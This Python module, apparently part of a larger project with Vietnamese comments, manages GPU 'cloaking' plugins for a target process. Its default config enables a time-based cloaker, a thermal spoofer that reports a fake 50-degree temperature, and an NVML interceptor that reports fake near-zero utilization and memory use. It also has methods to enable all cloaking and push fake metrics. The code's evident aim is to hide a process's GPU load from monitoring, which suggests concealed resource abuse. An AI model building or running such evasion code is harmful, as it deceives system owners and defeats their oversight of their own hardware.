"""GPU Plugin Manager - Quản lý centralized tất cả GPU plugins"""
import os
import json
import logging
from typing import Dict, List, Any, Optional
from pathlib import Path
import time

from .interfaces import IGPUPlugin, IGPUCloakService, IGPUHookManager
# IGPUTelemetryFilter removed - telemetry functionality deprecated
from .registry import gpu_plugin_registry

# Import GPU optimization logger và domain functions
try:
    from ...scripts.module_loggers import (
        get_gpu_optimization_logger, 
        log_gpu_optimization_operation,
        log_plugin_lifecycle,
        log_gpu_optimization
    )
    gpu_opt_logger = get_gpu_optimization_logger()
except ImportError:
    # Fallback nếu không có logger
    class DummyLogger:
        def info(self, *args, **kwargs): pass
        def error(self, *args, **kwargs): pass
        def warning(self, *args, **kwargs): pass
        def log_function_call(self, *args, **kwargs): pass
    gpu_opt_logger = DummyLogger()
    
    # Dummy functions khi không import được
    def log_gpu_optimization_operation(*args, **kwargs): pass
    def log_plugin_lifecycle(*args, **kwargs): pass
    def log_gpu_optimization(*args, **kwargs):
        def decorator(func):
            return func
        return decorator

logger = logging.getLogger(__name__)

class GPUPluginManager:
    """Centralized manager cho tất cả GPU plugins"""
    
    def __init__(self, config_path: Optional[str] = None, target_pid: Optional[int] = None):
        self.config_path = config_path or self._get_default_config_path()
        self.config = self._load_config()
        self.registry = gpu_plugin_registry
        self.active_plugins: Dict[str, IGPUPlugin] = {}
        self.running = False
        self.target_pid = target_pid  # ✅ Store dynamic PID for plugins
        
    def _get_default_config_path(self) -> str:
        """Get default configuration file path"""
        return os.path.join(os.path.dirname(__file__), '..', 'config', 'gpu_plugins.yml')
        
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    if self.config_path.endswith('.yml') or self.config_path.endswith('.yaml'):
                        import yaml
                        config = yaml.safe_load(f)
                    else:
                        config = json.load(f)
                logger.info(f"Loaded GPU plugins config from {self.config_path}")
                return config
            else:
                logger.warning(f"Config file not found: {self.config_path}, using defaults")
                return self._get_default_config()
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            return self._get_default_config()
            
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration"""
        return {
            'plugins': {
                'time_based_cloaking': {
                    'enabled': True,
                    'work_ms': 800,
                    'sleep_ms': 200
                },
                'thermal_spoofer': {
                    'enabled': True,
                    'fake_temperature': 50,
                    'add_noise': True
                },
                'nvml_interceptor': {
                    'enabled': True,
                    'fake_utilization': 2,
                    'fake_memory_used': 100
                },
            },
            'global': {
                'log_level': 'INFO',
                'enable_monitoring': True
            }
        }
        
    @log_gpu_optimization(measure_performance=True)
    def load_plugin(self, name: str, config: Optional[Dict[str, Any]] = None) -> bool:
        """Load và khởi tạo plugin
        
        Args:
            name: Tên plugin
            config: Cấu hình plugin (optional)
            
        Returns:
            bool: True nếu load thành công
        """
        start_time = time.time()
        
        if name in self.active_plugins:
            logger.info(f"Plugin {name} already loaded")
            log_plugin_lifecycle(name, "LOAD", "SUCCESS", 
                                               {"reason": "already_loaded"})
            return True
            
        # Get plugin config
        plugin_config = config or self.config.get('plugins', {}).get(name, {})
        
        # Check if plugin is enabled
        if not plugin_config.get('enabled', True):
            logger.info(f"Plugin {name} is disabled in config")
            log_plugin_lifecycle(name, "LOAD", "DISABLED", 
                                               {"config": plugin_config})
            return False
            
        # Create plugin instance with dynamic PID
        plugin = self.registry.create_instance(name, self.target_pid)
        if not plugin:
            error_msg = f"Failed to create plugin instance: {name}"
            logger.error(error_msg)
            log_plugin_lifecycle(name, "LOAD", "FAILED", 
                                               {"error": error_msg})
            return False
            
        # Initialize plugin
        try:
            if plugin.initialize(plugin_config):
                self.active_plugins[name] = plugin
                execution_time = time.time() - start_time
                
                logger.info(f"Successfully loaded GPU plugin: {name}")
                log_plugin_lifecycle(name, "LOAD", "SUCCESS", 
                                                   {"config": plugin_config,
                                                    "execution_time": execution_time})
                return True
            else:
                error_msg = f"Failed to initialize plugin: {name}"
                logger.error(error_msg)
                log_plugin_lifecycle(name, "LOAD", "FAILED", 
                                                   {"error": error_msg, "config": plugin_config})
                return False
        except Exception as e:
            error_msg = f"Error initializing plugin {name}: {e}"
            logger.error(error_msg)
            log_plugin_lifecycle(name, "LOAD", "FAILED", 
                                               {"error": error_msg, "config": plugin_config})
            return False
            
    def unload_plugin(self, name: str) -> bool:
        """Unload plugin
        
        Args:
            name: Tên plugin
            
        Returns:
            bool: True nếu unload thành công
        """
        if name not in self.active_plugins:
            logger.warning(f"Plugin {name} is not loaded")
            return False
            
        try:
            self.active_plugins[name].stop()
            del self.active_plugins[name]
            logger.info(f"Successfully unloaded GPU plugin: {name}")
            return True
        except Exception as e:
            logger.error(f"Error unloading plugin {name}: {e}")
            return False
            
    @log_gpu_optimization(measure_performance=True)
    def start_all_plugins(self) -> Dict[str, bool]:
        """Start tất cả loaded plugins
        
        Returns:
            Dict mapping tên plugin -> success status
        """
        start_time = time.time()
        results = {}
        
        for name, plugin in self.active_plugins.items():
            try:
                plugin_start_time = time.time()
                
                # ✅ Enhanced validation before starting
                logger.debug(f"🔄 Starting GPU plugin: {name} (type: {type(plugin).__name__})")
                
                # Validate plugin has required methods
                if not hasattr(plugin, 'start') or not callable(getattr(plugin, 'start')):
                    error_msg = f"Plugin {name} missing start() method"
                    logger.error(f"❌ {error_msg}")
                    log_plugin_lifecycle(name, "START", "FAILED", 
                                                       {"error": error_msg, "reason": "missing_start_method"})
                    results[name] = False
                    continue
                
                # Call plugin start with enhanced error context
                results[name] = plugin.start()
                plugin_execution_time = time.time() - plugin_start_time
                
                if results[name]:
                    logger.info(f"✅ Started GPU plugin: {name} (execution_time: {plugin_execution_time:.3f}s)")
                    log_plugin_lifecycle(name, "START", "SUCCESS", 
                                                       {"execution_time": plugin_execution_time})
                else:
                    logger.error(f"❌ Failed to start GPU plugin: {name} (start() returned False)")
                    log_plugin_lifecycle(name, "START", "FAILED", 
                                                       {"error": "plugin_start_returned_false", 
                                                        "execution_time": plugin_execution_time})
                    
                    # ✅ Enhanced: Try to get plugin status for debugging
                    try:
                        if hasattr(plugin, 'get_status'):
                            status = plugin.get_status()
                            logger.debug(f"🔍 Plugin {name} status after failed start: {status}")
                    except Exception as status_error:
                        logger.debug(f"Could not get status for plugin {name}: {status_error}")
                        
            except Exception as e:
                plugin_execution_time = time.time() - plugin_start_time
                error_msg = f"Exception starting plugin {name}: {e}"
                logger.error(f"❌ {error_msg}")
                
                # ✅ Enhanced: Include full stack trace for critical errors
                import traceback
                logger.debug(f"💥 Plugin {name} start exception traceback:")
                logger.debug(traceback.format_exc())
                
                log_plugin_lifecycle(name, "START", "FAILED", 
                                                   {"error": error_msg, 
                                                    "exception_type": type(e).__name__,
                                                    "execution_time": plugin_execution_time})
                results[name] = False
                
        self.running = True
        total_execution_time = time.time() - start_time
        
        # Log overall operation
        successful_plugins = sum(1 for success in results.values() if success)
        total_plugins = len(results)
        
        gpu_opt_logger.log_function_call(
            function_name="GPUPluginManager.start_all_plugins",
            status="SUCCESS" if successful_plugins > 0 else "FAILED",
            execution_time=total_execution_time,
            additional_data={
                "successful_plugins": successful_plugins,
                "total_plugins": total_plugins,
                "success_rate": successful_plugins / total_plugins if total_plugins > 0 else 0,
                "plugin_results": results
            }
        )
        
        return results
        
    def stop_all_plugins(self) -> None:
        """Stop tất cả plugins"""
        for name, plugin in self.active_plugins.items():
            try:
                plugin.stop()
                logger.info(f"Stopped GPU plugin: {name}")
            except Exception as e:
                logger.error(f"Error stopping plugin {name}: {e}")
                
        self.running = False
        
    def get_cloaking_services(self) -> List[IGPUCloakService]:
        """Lấy tất cả cloaking services đang active
        
        Returns:
            List of IGPUCloakService instances
        """
        return [plugin for plugin in self.active_plugins.values() 
                if isinstance(plugin, IGPUCloakService)]
                
    def get_telemetry_filters(self) -> List:
        """Telemetry functionality has been removed
        
        Returns:
            Empty list - telemetry filters deprecated
        """
        return []
                
    def get_hook_managers(self) -> List[IGPUHookManager]:
        """Lấy tất cả hook managers đang active
        
        Returns:
            List of IGPUHookManager instances
        """
        return [plugin for plugin in self.active_plugins.values() 
                if isinstance(plugin, IGPUHookManager)]
                
    def enable_all_cloaking(self) -> Dict[str, bool]:
        """Enable tất cả cloaking strategies
        
        Returns:
            Dict mapping service name -> success status
        """
        results = {}
        for service in self.get_cloaking_services():
            try:
                # Get available strategies for this service
                strategies = service.get_active_strategies()
                results[service.name] = service.enable_cloaking(strategies)
            except Exception as e:
                logger.error(f"Error enabling cloaking for {service.name}: {e}")
                results[service.name] = False
                
        return results
        
    def update_all_fake_metrics(self, metrics: Dict[str, int]) -> None:
        """Update fake metrics cho tất cả cloaking services
        
        Args:
            metrics: Dictionary chứa metrics và giá trị fake
        """
        for service in self.get_cloaking_services():
            try:
                service.update_fake_metrics(metrics)
                logger.info(f"Updated fake metrics for {service.name}")
            except Exception as e:
                logger.error(f"Error updating metrics for {service.name}: {e}")
                
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái tổng thể của GPU plugin system
        
        Returns:
            Dict chứa trạng thái system
        """
        plugin_status = {}
        for name, plugin in self.active_plugins.items():
            try:
                plugin_status[name] = plugin.get_status()
            except Exception as e:
                plugin_status[name] = {"error": str(e)}
                
        return {
            'running': self.running,
            'loaded_plugins': list(self.active_plugins.keys()),
            'available_plugins': self.registry.list_plugins(),
            'plugin_status': plugin_status,
            'config': self.config
        }